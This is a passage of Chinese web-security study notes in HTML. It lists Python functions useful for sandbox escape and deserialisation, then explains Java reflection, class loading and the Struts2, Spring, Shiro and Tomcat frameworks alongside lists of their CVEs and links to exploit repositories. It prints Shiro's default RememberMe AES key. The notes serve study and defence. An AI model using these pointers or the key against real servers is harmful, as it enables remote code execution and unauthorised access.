<li>pty.spawn</li>
<li>subprocess</li>
<li>timeit.sys</li>
<li>timeit.timeit</li>
<li>...</li>
</ul>
</div>
<div class="section" id="id2">
<h5>文件读取<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>open</li>
<li>os.open</li>
<li>urllib.request.urlopen('<a class="reference external" href="file:///">file:///</a>')</li>
<li>codecs.open</li>
<li>fileinput</li>
<li><dl class="first docutils">
<dt>仅Python2</dt>
<dd><ul class="first last">
<li>types.FileType</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h5>危险第三方库<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Template</li>
<li>subprocess32</li>
</ul>
</div>
<div class="section" id="id4">
<h5>反序列化<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>marshal</li>
<li>PyYAML</li>
<li>pickle</li>
<li>cPickle</li>
<li>shelve</li>
<li>PIL</li>
</ul>
</div>
</div>
<span id="document-language/python/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>反序列化<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.91ri.org/9576.html">Python pickle反序列化</a></li>
<li><a class="reference external" href="https://wiki.python.org/moin/SandboxedPython">Python 沙箱 官方wiki</a></li>
<li><a class="reference external" href="http://xxlegend.com/2015/07/31/Python%20eval的常见错误封装及利用原理/">Python eval的常见错误封装及利用原理</a></li>
<li><a class="reference external" href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle Python 对象序列化</a></li>
<li><a class="reference external" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles A serialised exploitation guide in one part</a></li>
<li><a class="reference external" href="https://rushter.com/blog/pickle-serialization-internals/">How pickle works in Python</a></li>
</ul>
</div>
<div class="section" id="id3">
<h5>沙箱<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.anquanke.com/post/id/86366">Python 沙箱通用绕过</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/system/203208.html">一文看懂Python沙箱逃逸</a></li>
</ul>
</div>
<div class="section" id="id5">
<h5>格式化字符串<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python字符串格式化漏洞</a></li>
<li><a class="reference external" href="http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">Be Careful with Python's New-Style String Format</a></li>
</ul>
</div>
<div class="section" id="id7">
<h5>综合<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/vstinner/python-security.git">python security</a></li>
<li><a class="reference external" href="https://github.com/bit4woo/python_sec">Python安全和代码审计相关资料收集</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-language/java/index"></span><div class="section" id="java">
<h3>Java<a class="headerlink" href="#java" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-language/java/basic"></span><div class="section" id="id1">
<h4>基本概念<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="jvm">
<h5>JVM<a class="headerlink" href="#jvm" title="永久链接至标题">¶</a></h5>
<p>JVM是Java平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。</p>
<p>JCL是JVM自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的，且拥有所有的特权。</p>
</div>
<div class="section" id="jdk">
<h5>JDK<a class="headerlink" href="#jdk" title="永久链接至标题">¶</a></h5>
<p>Java开发工具包(Java Development Kit，JDK)是Oracle公司发布的Java平台，有标准版(Standard Edition，Java SE)、企业版(Enterprise Edition，Java EE)等版本。</p>
<p>在最开始，JDK以二进制形式发布，而后在2006年11月17日，Sun以GPL许可证发布了Java的源代码，于是之后出现了OpenJDK。</p>
</div>
<div class="section" id="jmx">
<h5>JMX<a class="headerlink" href="#jmx" title="永久链接至标题">¶</a></h5>
<p>JMX(Java Management Extensions，Java管理扩展)是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX可以远程读取系统中的值、调用系统中的方法。在JMX未配置身份验证或JDK版本过低存在反序列化漏洞时，可能会导致远程代码执行。</p>
</div>
<div class="section" id="jni">
<h5>JNI<a class="headerlink" href="#jni" title="永久链接至标题">¶</a></h5>
<p>JNI (Java Native Interface) 是Java提供的和其他语言交互的接口。</p>
</div>
<div class="section" id="jna">
<h5>JNA<a class="headerlink" href="#jna" title="永久链接至标题">¶</a></h5>
<p>JNA (Java Native Access) 是在JNI上的框架，用于自动实现Java接口到native function的映射，而不需要另外编写JNI代码。</p>
</div>
<div class="section" id="ognl">
<h5>OGNL<a class="headerlink" href="#ognl" title="永久链接至标题">¶</a></h5>
<p>OGNL(Object-Graph Navigation Language，对象导航语言)是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。</p>
<p>Struts2中使用了OGNL，提供了一个ValueStack类。ValueStack分为root和context两部分。root中是当前的action对象，context中是ActionContext里面所有的内容。</p>
</div>
<div class="section" id="io">
<h5>IO模型<a class="headerlink" href="#io" title="永久链接至标题">¶</a></h5>
<p>Java 对操作系统的各种 IO 模型进行了封装，形成了不同的API。</p>
<div class="section" id="bio">
<h6>BIO<a class="headerlink" href="#bio" title="永久链接至标题">¶</a></h6>
<p>BIO (Blocking I/O) 是同步阻塞I/O模式，数据的读取写入必须阻塞在一个线程内等待其完成。</p>
</div>
<div class="section" id="nio">
<h6>NIO<a class="headerlink" href="#nio" title="永久链接至标题">¶</a></h6>
<p>NIO (New I/O) 是一种同步非阻塞的I/O模型，在Java 1.4中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer等抽象。</p>
</div>
<div class="section" id="aio">
<h6>AIO<a class="headerlink" href="#aio" title="永久链接至标题">¶</a></h6>
<p>AIO (Asynchronous I/O) 在 Java 7 中引入，是NIO的改进版，是异步非阻塞的IO模型，基于事件和回调机制实现。</p>
</div>
</div>
<div class="section" id="id2">
<h5>反射<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id3">
<h6>简介<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。</p>
</div>
<div class="section" id="id4">
<h6>相关类<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<table border="1" class="docutils">
<colgroup>
<col width="46%" />
<col width="54%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">类名</th>
<th class="head">用途</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>Class</td>
<td>类的实体</td>
</tr>
<tr class="row-odd"><td>Field</td>
<td>类的成员变量</td>
</tr>
<tr class="row-even"><td>Method</td>
<td>类的方法</td>
</tr>
<tr class="row-odd"><td>Constructor</td>
<td>类的构造方法</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="class">
<h6>Class相关<a class="headerlink" href="#class" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>asSubclass(Class&lt;U&gt; clazz)</dt>
<dd><ul class="first last">
<li>把传递的类的对象转换成代表其子类的对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Cast</dt>
<dd><ul class="first last">
<li>把对象转换成代表类或是接口的对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getClassLoader()</dt>
<dd><ul class="first last">
<li>获得类的加载器</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getClasses()</dt>
<dd><ul class="first last">
<li>返回一个数组，数组中包含该类中所有公共类和接口类的对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredClasses()</dt>
<dd><ul class="first last">
<li>返回一个数组，数组中包含该类中所有类和接口类的对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>forName(String className)</dt>
<dd><ul class="first last">
<li>根据类名返回类的对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getName()</dt>
<dd><ul class="first last">
<li>获得类的完整路径名字</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>newInstance()</dt>
<dd><ul class="first last">
<li>创建类的实例</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getPackage()</dt>
<dd><ul class="first last">
<li>获得类的包</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getSimpleName()</dt>
<dd><ul class="first last">
<li>获得类的名字</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getSuperclass()</dt>
<dd><ul class="first last">
<li>获得当前类继承的父类的名字</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getInterfaces()</dt>
<dd><ul class="first last">
<li>获得当前类实现的类或是接口</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getField(String name)</dt>
<dd><ul class="first last">
<li>获得某个公有的属性对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getFields()</dt>
<dd><ul class="first last">
<li>获得所有公有的属性对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredField(String name)</dt>
<dd><ul class="first last">
<li>获得某个属性对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredFields()</dt>
<dd><ul class="first last">
<li>获得所有属性对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getAnnotation(Class&lt;A&gt; annotationClass)</dt>
<dd><ul class="first last">
<li>返回该类中与参数类型匹配的公有注解对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getAnnotations()</dt>
<dd><ul class="first last">
<li>返回该类所有的公有注解对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredAnnotation(Class&lt;A&gt; annotationClass)</dt>
<dd><ul class="first last">
<li>返回该类中与参数类型匹配的所有注解对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredAnnotations()</dt>
<dd><ul class="first last">
<li>返回该类所有的注解对象</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getConstructor(Class...&lt;?&gt; parameterTypes)</dt>
<dd><ul class="first last">
<li>获得该类中与参数类型匹配的公有构造方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getConstructors()</dt>
<dd><ul class="first last">
<li>获得该类的所有公有构造方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredConstructor(Class...&lt;?&gt; parameterTypes)</dt>
<dd><ul class="first last">
<li>获得该类中与参数类型匹配的构造方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredConstructors()</dt>
<dd><ul class="first last">
<li>获得该类所有构造方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getMethod(String name, Class...&lt;?&gt; parameterTypes)</dt>
<dd><ul class="first last">
<li>获得该类某个公有的方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getMethods()</dt>
<dd><ul class="first last">
<li>获得该类所有公有的方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredMethod(String name, Class...&lt;?&gt; parameterTypes)</dt>
<dd><ul class="first last">
<li>获得该类某个方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>getDeclaredMethods()</dt>
<dd><ul class="first last">
<li>获得该类所有方法</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isAnnotation()</dt>
<dd><ul class="first last">
<li>如果是注解类型则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)</dt>
<dd><ul class="first last">
<li>如果是指定类型注解类型则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isAnonymousClass()</dt>
<dd><ul class="first last">
<li>如果是匿名类则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isArray()</dt>
<dd><ul class="first last">
<li>如果是一个数组类则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isEnum()</dt>
<dd><ul class="first last">
<li>如果是枚举类则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isInstance(Object obj)</dt>
<dd><ul class="first last">
<li>如果obj是该类的实例则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isInterface()</dt>
<dd><ul class="first last">
<li>如果是接口类则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isLocalClass()</dt>
<dd><ul class="first last">
<li>如果是局部类则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>isMemberClass()</dt>
<dd><ul class="first last">
<li>如果是内部类则返回true</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="field">
<h6>Field相关<a class="headerlink" href="#field" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>equals(Object obj)</dt>
<dd><ul class="first last">
<li>属性与obj相等则返回true</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>get(Object obj)</dt>
<dd><ul class="first last">
<li>获得obj中对应的属性值</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>set(Object obj, Object value)</dt>
<dd><ul class="first last">
<li>设置obj中对应属性值</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="method">
<h6>Method相关<a class="headerlink" href="#method" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>invoke(Object obj, Object... args)</dt>
<dd><ul class="first last">
<li>传递object对象及参数调用该对象对应的方法</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="constructor">
<h6>Constructor<a class="headerlink" href="#constructor" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>newInstance(Object... initargs)</dt>
<dd><ul class="first last">
<li>根据传递的参数创建类的对象</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
</div>
<span id="document-language/java/class"></span><div class="section" id="id1">
<h4>类<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>生命周期<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>整体来说，Java中类的生命周期如下：加载 (Loading) -&gt; [ 连接 (Linking) : 验证 (Verification) -&gt; 准备 (Perparation) -&gt; 解析 (Resolutin) ] -&gt; 初始化 (Initialization) -&gt; 使用 (Using) -&gt; 卸载 (Unloading) 。</p>
<p>加载过程分为三步：</p>
<ul class="simple">
<li>通过全限定类名来获取定义此类的二进制字节流</li>
<li>将字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在内存中生成代表这个类的 <code class="docutils literal notranslate"><span class="pre">java.lang.Class</span></code> 对象，作为方法区这个类的各种数据的访问入口</li>
</ul>
<p>验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：</p>
<ul class="simple">
<li>判断文件格式：是否以 <code class="docutils literal notranslate"><span class="pre">0xCAFEBABE</span></code> 开始，主次版本号是否在处理范围内</li>
<li>元数据验证</li>
<li>字节码验证</li>
<li>符号引用验证</li>
</ul>
</div>
</div>
<span id="document-language/java/opt"></span><div class="section" id="id1">
<h4>部分运行选项与说明<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-Xverify:none</span></code> 关闭类加载时的验证措施</li>
</ul>
</div>
<span id="document-language/java/framework"></span><div class="section" id="id1">
<h4>框架<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="servlet">
<h5>Servlet<a class="headerlink" href="#servlet" title="永久链接至标题">¶</a></h5>
<div class="section" id="id2">
<h6>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<p>Servlet(Server Applet)是Java Servlet的简称，称为小服务程序或服务连接器，是用Java编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态Web内容。</p>
<p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。Servlet运行于支持Java的应用服务器中。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。</p>
</div>
<div class="section" id="id3">
<h6>生命周期为<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>客户端请求该 Servlet</li>
<li>加载 Servlet 类到内存</li>
<li>实例化并调用init()方法初始化该 Servlet</li>
<li>service()(根据请求方法不同调用 <code class="docutils literal notranslate"><span class="pre">doGet()</span></code> / <code class="docutils literal notranslate"><span class="pre">doPost()</span></code> / ... / <code class="docutils literal notranslate"><span class="pre">destroy()</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h6>接口<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<p><code class="docutils literal notranslate"><span class="pre">init()</span></code></p>
<p>在 Servlet 的生命期中，仅执行一次 init() 方法，在服务器装入 Servlet 时执行。</p>
<p><code class="docutils literal notranslate"><span class="pre">service()</span></code></p>
<p>service() 方法是 Servlet 的核心。每当一个客户请求一个HttpServlet对象，该对象的 <code class="docutils literal notranslate"><span class="pre">service()</span></code> 方法就要被调用，而且传递给这个方法一个&quot;请求&quot;(ServletRequest)对象和一个&quot;响应&quot;(ServletResponse)对象作为参数。</p>
</div>
</div>
<div class="section" id="struts-2">
<h5>Struts 2<a class="headerlink" href="#struts-2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id5">
<h6>简介<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p>
</div>
<div class="section" id="id6">
<h6>请求流程<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>客户端发送请求的tomcat服务器</li>
<li>请求经过一系列过滤器</li>
<li>FilterDispatcher调用ActionMapper来决定这个请求是否要调用某个Action</li>
<li>ActionMppaer决定调用某个ActionFilterDispatcher把请求给ActionProxy</li>
<li>ActionProxy通过Configuration Manager查看structs.xml，找到对应的Action类</li>
<li>ActionProxy创建一个ActionInvocation对象</li>
<li>ActionInvocation对象回调Action的execute方法</li>
<li>Action执行完毕后，ActionInvocation根据返回的字符串，找到相应的result，通过HttpServletResponse返回给服务器</li>
</ul>
</div>
<div class="section" id="cve">
<h6>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>CVE-2016-3081 (S2-032)</li>
<li>CVE-2016-3687 (S2-033)</li>
<li>CVE-2016-4438 (S2-037)</li>
<li><a class="reference external" href="https://github.com/immunio/apache-struts2-CVE-2017-5638">CVE-2017-5638</a></li>
<li>CVE-2017-7672</li>
<li>CVE-2017-9787</li>
<li>CVE-2017-9793</li>
<li>CVE-2017-9804</li>
<li><a class="reference external" href="https://github.com/mazen160/struts-pwn_CVE-2017-9805">CVE-2017-9805</a></li>
<li><a class="reference external" href="https://github.com/brianwrf/S2-053-CVE-2017-12611">CVE-2017-12611</a></li>
<li>CVE-2017-15707</li>
<li>CVE-2018-1327</li>
<li>CVE-2018-11776</li>
</ul>
</div>
</div>
<div class="section" id="spring">
<h5>Spring<a class="headerlink" href="#spring" title="永久链接至标题">¶</a></h5>
<div class="section" id="id7">
<h6>简介<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<p>Spring一般指的是Spring Framework，一个轻量级Java应用程序开源框架，提供了简易的开发方式。</p>
</div>
<div class="section" id="spring-mvc">
<h6>Spring MVC<a class="headerlink" href="#spring-mvc" title="永久链接至标题">¶</a></h6>
<p>Spring MVC根据Spring的模式设计的MVC框架，主要用于开发Web应用，简化开发。</p>
</div>
<div class="section" id="spring-boot">
<h6>Spring Boot<a class="headerlink" href="#spring-boot" title="永久链接至标题">¶</a></h6>
<p>Spring在推出之初方案较为繁琐，因此提供了Spring Boot作为自动化配置工具，降低项目搭建的复杂度。</p>
</div>
<div class="section" id="id8">
<h6>请求流程<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>用户发送请求给服务器</li>
<li>服务器收到请求，使用DispatchServlet处理</li>
<li>Dispatch使用HandleMapping检查url是否有对应的Controller，如果有，执行</li>
<li>如果Controller返回字符串，ViewResolver将字符串转换成相应的视图对象</li>
<li>DispatchServlet将视图对象中的数据，输出给服务器</li>
<li>服务器将数据输出给客户端</li>
</ul>
</div>
<div class="section" id="id9">
<h6>CVE概览<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2018-1270</dt>
<dd><ul class="first last">
<li>Spring Websocket 远程代码执行漏洞</li>
<li>Spring Framework 5.0 - 5.0.5</li>
<li>Spring Framework 4.3 - 4.3.15</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2018-1273</dt>
<dd><ul class="first last">
<li>Spring Data 远程代码执行漏洞</li>
<li>Spring Data Commons 1.13 - 1.13.10</li>
<li>Spring Data Commons 2.0 - 2.0.5</li>
<li>Spring Data REST 2.6 - 2.6.10</li>
<li>Spring Data REST 3.0 - 3.0.5</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2017-8046</dt>
<dd><ul class="first last">
<li>Spring Data REST 远程代码执行漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2017-4971</dt>
<dd><ul class="first last">
<li>Spring Web Flow 远程代码执行漏洞</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="shiro">
<h5>Shiro<a class="headerlink" href="#shiro" title="永久链接至标题">¶</a></h5>
<div class="section" id="id10">
<h6>简介<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro是一个功能强大且易于使用的Java安全框架，功能包括身份验证，授权，加密和会话管理。</p>
</div>
<div class="section" id="id11">
<h6>CVE概览<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2020-13933</dt>
<dd><ul class="first last">
<li>Apache Shiro &lt; 1.6.0</li>
<li>身份验证绕过漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2020-11989</dt>
<dd><ul class="first last">
<li>SHIRO-782</li>
<li>Apache Shiro &lt; 1.5.3</li>
<li>身份验证绕过漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2020-1957</dt>
<dd><ul class="first last">
<li>SHIRO-682</li>
<li>Apache Shiro &lt; 1.5.2</li>
<li>身份验证绕过漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2019-12422</dt>
<dd><ul class="first last">
<li>SHIRO-721</li>
<li>Apache Shiro &lt; 1.4.2</li>
<li>Padding Oracle Attack 远程代码执行漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2016-4437</dt>
<dd><ul class="first last">
<li>SHIRO-550</li>
<li>Apache Shiro &lt;= 1.2.4</li>
<li>反序列化远程代码执行漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2014-0074</dt>
<dd><ul class="first last">
<li>SHIRO-460</li>
<li>Apache Shiro &lt; 1.2.3</li>
<li>身份验证绕过漏洞</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="cve-2020-13933">
<h6>CVE-2020-13933<a class="headerlink" href="#cve-2020-13933" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro 1.6.0之前的版本，由于Shiro拦截器与requestURI的匹配流程与Web框架的拦截器的匹配流程有差异，攻击者构造一个特殊的http请求，可以绕过Shiro的认证，未授权访问敏感路径。</p>
</div>
<div class="section" id="cve-2020-11989">
<h6>CVE-2020-11989<a class="headerlink" href="#cve-2020-11989" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro 1.5.3之前的版本，由于Shiro拦截器与requestURI的匹配流程与Web框架的拦截器的匹配流程有差异，攻击者构造一个特殊的http请求，可以绕过Shiro的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。</p>
</div>
<div class="section" id="cve-2020-1957">
<h6>CVE-2020-1957<a class="headerlink" href="#cve-2020-1957" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro 1.5.2之前的版本，由于Shiro拦截器与requestURI的匹配流程与Web框架的拦截器的匹配流程有差异，攻击者构造一个特殊的http请求，可以绕过Shiro的认证，未授权访问敏感路径。</p>
</div>
<div class="section" id="cve-2019-12422">
<h6>CVE-2019-12422<a class="headerlink" href="#cve-2019-12422" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro 1.4.2之前的版本默认使用 <code class="docutils literal notranslate"><span class="pre">AES/CBC/PKCS5Padding</span></code> 模式加密,开启RememberMe功能的Shiro组件将允许远程攻击者构造序列化数据，通过Padding Oracle Attack进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。</p>
</div>
<div class="section" id="cve-2016-4437">
<h6>CVE-2016-4437<a class="headerlink" href="#cve-2016-4437" title="永久链接至标题">¶</a></h6>
<p>Apache Shiro 1.2.5之前的版本在 <code class="docutils literal notranslate"><span class="pre">org.apache.shiro.mgt.AbstractRememberMeManager</span></code> 中存在AES默认秘钥 <code class="docutils literal notranslate"><span class="pre">kPH+bIxk5D2deZiIxcaaaA==</span></code> ，开启RememberMe功能的Shiro组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。</p>
</div>
</div>
</div>
<span id="document-language/java/container"></span><div class="section" id="id1">
<h4>容器<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>常见的Java服务器有Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere等，这里对部分框架做一个简单的说明。</p>
<div class="section" id="tomcat">
<h5>Tomcat<a class="headerlink" href="#tomcat" title="永久链接至标题">¶</a></h5>
<p>Tomcat是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试JSP程序。</p>
<p>在收到请求后，Tomcat的处理流程如下：</p>
<ul class="simple">
<li>客户端访问Web服务器，发送HTTP请求</li>
<li>Web服务器接收到请求后，传递给Servlet容器</li>
<li>Servlet容器加载Servlet，产生Servlet实例后，向其传递表示请求和响应的对象</li>
<li>Servlet实例使用请求对象得到客户端的请求信息，然后进行相应的处理</li>
<li>Servlet实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web服务器</li>
</ul>
<p>Tomcat服务器是由一系列可配置的组件构成的，其中核心组件是Catalina Servlet容器，它是所有其他Tomcat组件的顶层容器。</p>
<div class="section" id="cve">
<h6>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2020-1938</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://www.freebuf.com/vuls/228108.html">https://www.freebuf.com/vuls/228108.html</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2019-0232</dt>
<dd><ul class="first last">
<li>远程代码执行</li>
<li><a class="reference external" href="https://github.com/pyn3rd/CVE-2019-0232/">https://github.com/pyn3rd/CVE-2019-0232/</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2017-12615</dt>
<dd><ul class="first last">
<li>任意文件写入</li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</a></li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2013-2067</li>
<li>CVE-2012-4534</li>
<li>CVE-2012-4431</li>
<li>CVE-2012-3546</li>
<li>CVE-2012-3544</li>
<li>CVE-2012-2733</li>
<li>CVE-2011-3375</li>
<li>CVE-2011-3190</li>
<li>CVE-2008-2938</li>
</ul>
</div>
</div>
<div class="section" id="weblogic">
<h5>Weblogic<a class="headerlink" href="#weblogic" title="永久链接至标题">¶</a></h5>
<div class="section" id="id2">
<h6>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
